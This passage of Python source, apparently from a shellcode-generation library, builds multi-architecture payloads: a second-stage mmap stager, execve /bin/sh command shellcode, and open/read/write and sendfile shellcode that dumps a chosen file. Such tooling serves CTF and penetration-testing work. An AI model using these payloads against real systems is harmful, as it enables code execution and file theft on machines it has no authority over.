    input_fd: int = 0,
    page_size: int = 0x1000,
    assembler: Assembler | None = None,
) -> Payload:
    """Build a loader that allocates, reads, finalizes, and runs a second stage."""

    source, map_size = mmap_stager_source(size, target, input_fd=input_fd, page_size=page_size)
    data = (assembler or ZigAssembler()).assemble(source, target)
    return Payload(
        data=data,
        target=target,
        kind=PayloadKind.SHELLCODE,
        description="mmap/read/mprotect/cache-finalize/jump stager",
        memory=(
            MemoryRequirement(
                len(data),
                Permission.READ | Permission.EXECUTE,
                "first-stage shellcode bytes",
                alignment=_instruction_alignment(target),
            ),
            MemoryRequirement(
                map_size,
                Permission.READ | Permission.EXECUTE,
                "second-stage mapping (writable only while loading)",
                alignment=page_size,
            ),
        ),
        data_requirement_index=0,
        metadata={
            "operation": "allocate-read-execute",
            "stage_size": size,
            "mapping_size": map_size,
            "input_fd": input_fd,
            "mapping_transition": "rw-to-rx",
            "exact_read_loop": True,
            "instruction_cache_finalized": True,
            "requires_instruction_cache_sync_after_runtime_write": _requires_instruction_cache_sync(target),
            "position_independent": True,
            "assembly": source,
        },
    )


def command_source(command: str | bytes, target: Target) -> tuple[str, int]:
    """Lower ``execve('/bin/sh', ['sh', '-c', command], NULL)`` to assembly."""

    stack = _execve_stack(target, command)
    lines = _header(target)
    if target.arch in {Architecture.X86, Architecture.X86_64}:
        lines.extend(_x86_execve(target, stack))
    elif target.arch in {Architecture.ARM, Architecture.THUMB}:
        lines.extend(_arm_execve(target, stack))
    elif target.arch is Architecture.ARM64:
        lines.extend(_aarch64_execve(target, stack))
    elif target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
        lines.extend(_mips_execve(target, stack))
    elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
        lines.extend(_riscv_execve(target, stack))
    elif target.arch in {Architecture.SPARC32, Architecture.SPARC64}:
        lines.extend(_sparc_execve(target, stack))
    elif target.arch is Architecture.S390X:
        lines.extend(_s390_execve(target, stack))
    elif target.arch in {Architecture.POWERPC32, Architecture.POWERPC64}:
        lines.extend(_powerpc_execve(target, stack))
    else:
        raise UnsupportedTargetError(f"command shellcode is not implemented for {target.name}")
    return "\n".join(lines) + "\n", stack.frame_size


def command_shellcode(
    command: str | bytes,
    target: Target,
    *,
    assembler: Assembler | None = None,
) -> Payload:
    """Build position-independent command shellcode for a fully resolved target."""

    source, stack_size = command_source(command, target)
    data = (assembler or ZigAssembler()).assemble(source, target)
    needs_cache_sync = _requires_instruction_cache_sync(target)
    return Payload(
        data=data,
        target=target,
        kind=PayloadKind.SHELLCODE,
        description="execve /bin/sh -c command shellcode",
        memory=(
            MemoryRequirement(
                len(data),
                Permission.READ | Permission.EXECUTE,
                "shellcode bytes",
                alignment=_instruction_alignment(target),
            ),
            MemoryRequirement(
                stack_size,
                Permission.READ | Permission.WRITE,
                "temporary execve stack image",
                alignment=target.convention.stack_alignment,
            ),
        ),
        data_requirement_index=0,
        metadata={
            "operation": "run-command",
            "syscall": "execve",
            "position_independent": True,
            "requires_instruction_cache_sync_after_runtime_write": needs_cache_sync,
            "assembly": source,
        },
    )


def orw_source(
    path: str | bytes,
    target: Target,
    *,
    max_bytes: int = 0x400,
    output_fd: int = 1,
) -> tuple[str, int]:
    """Lower one ``open/read/write`` pass to architecture-specific assembly."""

    if not 0 <= output_fd <= 0xFFFF:
        raise ValueError("output_fd must be in the range 0..65535")
    stack = _orw_stack(target, path, max_bytes)
    lines = _header(target)
    if target.arch in {Architecture.X86, Architecture.X86_64}:
        lines.extend(_x86_orw(target, stack, output_fd))
    elif target.arch in {Architecture.ARM, Architecture.THUMB}:
        lines.extend(_arm_orw(target, stack, output_fd))
    elif target.arch is Architecture.ARM64:
        lines.extend(_aarch64_orw(target, stack, output_fd))
    elif target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
        lines.extend(_mips_orw(target, stack, output_fd))
    elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
        lines.extend(_riscv_orw(target, stack, output_fd))
    elif target.arch in {Architecture.SPARC32, Architecture.SPARC64}:
        lines.extend(_sparc_orw(target, stack, output_fd))
    elif target.arch is Architecture.S390X:
        lines.extend(_s390_orw(target, stack, output_fd))
    elif target.arch in {Architecture.POWERPC32, Architecture.POWERPC64}:
        lines.extend(_powerpc_orw(target, stack, output_fd))
    else:
        raise UnsupportedTargetError(f"ORW shellcode is not implemented for {target.name}")
    return "\n".join(lines) + "\n", stack.frame_size


def orw_shellcode(
    path: str | bytes,
    target: Target,
    *,
    max_bytes: int = 0x400,
    output_fd: int = 1,
    assembler: Assembler | None = None,
) -> Payload:
    """Build position-independent shellcode that copies one file to an fd."""

    source, stack_size = orw_source(path, target, max_bytes=max_bytes, output_fd=output_fd)
    data = (assembler or ZigAssembler()).assemble(source, target)
    return Payload(
        data=data,
        target=target,
        kind=PayloadKind.SHELLCODE,
        description="open/read/write file shellcode",
        memory=(
            MemoryRequirement(
                len(data),
                Permission.READ | Permission.EXECUTE,
                "shellcode bytes",
                alignment=_instruction_alignment(target),
            ),
            MemoryRequirement(
                stack_size,
                Permission.READ | Permission.WRITE,
                "ORW path and read buffer",
                alignment=target.convention.stack_alignment,
            ),
        ),
        data_requirement_index=0,
        metadata={
            "operation": "open-read-write",
            "max_bytes": max_bytes,
            "output_fd": output_fd,
            "position_independent": True,
            "requires_instruction_cache_sync_after_runtime_write": _requires_instruction_cache_sync(target),
            "assembly": source,
        },
    )


def sendfile_orw_source(
    path: str | bytes,
    target: Target,
    *,
    count: int = 0x400,
    output_fd: int = 1,
) -> tuple[str, int]:
    """Lower ``open``/``openat`` plus ``sendfile`` without a read buffer."""

    if not 0 <= output_fd <= 0xFFFF:
        raise ValueError("output_fd must be in the range 0..65535")
    if count <= 0:
        raise ValueError("count must be positive")
    if count > target.mask:
        raise ValueError(f"count does not fit {target.bits}-bit target")

    stack = _sendfile_stack(target, path)
    syscalls = _sendfile_syscalls(target)
    lines = _header(target)
    if target.arch in {Architecture.X86, Architecture.X86_64}:
        lines.extend(_x86_sendfile_orw(target, stack, output_fd, count, syscalls))
    elif target.arch in {Architecture.ARM, Architecture.THUMB}:
        lines.extend(_arm_sendfile_orw(target, stack, output_fd, count, syscalls))
    elif target.arch is Architecture.ARM64:
        lines.extend(_aarch64_sendfile_orw(target, stack, output_fd, count, syscalls))
    elif target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
        lines.extend(_mips_sendfile_orw(target, stack, output_fd, count, syscalls))
    elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
        lines.extend(_riscv_sendfile_orw(target, stack, output_fd, count, syscalls))
    elif target.arch in {Architecture.SPARC32, Architecture.SPARC64}:
        lines.extend(_sparc_sendfile_orw(target, stack, output_fd, count, syscalls))
    elif target.arch is Architecture.S390X:
        lines.extend(_s390_sendfile_orw(target, stack, output_fd, count, syscalls))
    elif target.arch in {Architecture.POWERPC32, Architecture.POWERPC64}:
        lines.extend(_powerpc_sendfile_orw(target, stack, output_fd, count, syscalls))
    else:
        raise UnsupportedTargetError(f"sendfile ORW shellcode is not implemented for {target.name}")
    return "\n".join(lines) + "\n", stack.frame_size


def sendfile_orw_shellcode(
    path: str | bytes,
    target: Target,
    *,
    count: int = 0x400,
    output_fd: int = 1,
    assembler: Assembler | None = None,
) -> Payload:
    """Build shellcode that transfers a file directly to an output fd."""

    source, stack_size = sendfile_orw_source(path, target, count=count, output_fd=output_fd)
    syscalls = _sendfile_syscalls(target)
    data = (assembler or ZigAssembler()).assemble(source, target)
    return Payload(
        data=data,
        target=target,
        kind=PayloadKind.SHELLCODE,
        description=f"{syscalls.open_name}/sendfile file shellcode",
        memory=(
            MemoryRequirement(
                len(data),
                Permission.READ | Permission.EXECUTE,
                "shellcode bytes",
                alignment=_instruction_alignment(target),
            ),
            MemoryRequirement(
                stack_size,
                Permission.READ | Permission.WRITE,
                "temporary sendfile path stack image",
                alignment=target.convention.stack_alignment,
            ),
        ),
        data_requirement_index=0,
        metadata={
            "operation": "open-sendfile",
            "open_syscall": syscalls.open_name,
            "open_syscall_number": syscalls.open_number,
            "sendfile_syscall": syscalls.sendfile_name,
            "sendfile_syscall_number": syscalls.sendfile_number,
            "syscall_constants_source": syscalls.constants_source,
            "count": count,
            "output_fd": output_fd,
            "offset_pointer": None,
            "uses_read_buffer": False,
            "position_independent": True,
            "requires_instruction_cache_sync_after_runtime_write": _requires_instruction_cache_sync(target),
            "assembly": source,
        },
    )


__all__ = [
    "command_shellcode",
    "command_source",
    "exit_shellcode",
    "exit_source",
    "mmap_stager",
    "mmap_stager_source",
    "orw_shellcode",
    "orw_source",
    "qemu_semihosting_command_shellcode",
    "qemu_semihosting_command_source",
    "sendfile_orw_shellcode",
    "sendfile_orw_source",
]
